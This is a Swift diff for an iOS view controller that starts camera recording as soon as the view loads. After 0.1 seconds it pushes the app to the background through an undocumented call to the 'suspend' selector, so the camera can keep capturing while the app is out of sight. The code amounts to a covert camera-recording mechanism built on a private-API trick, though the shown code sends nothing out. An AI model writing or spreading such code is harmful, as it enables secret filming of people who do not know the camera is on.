@@ -7,17 +7,13 @@ class ViewController: UIViewController {
         super.viewDidLoad()
         view.backgroundColor = .black
         cameraManager.startSession()
+        startRecordingAndBackground()
     }
 
-    override func viewDidAppear(_ animated: Bool) {
-        super.viewDidAppear(animated)
-
-        // Start recording as soon as the view appears
-        if !cameraManager.isRecording {
-            cameraManager.startRecording()
-        }
-
-        // Send app to background immediately
+    func startRecordingAndBackground() {
+        cameraManager.startRecording()
+        
+        // After starting recording, immediately move the app to the background
         DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
             UIApplication.shared.perform(#selector(NSXPCConnection.suspend))
         }
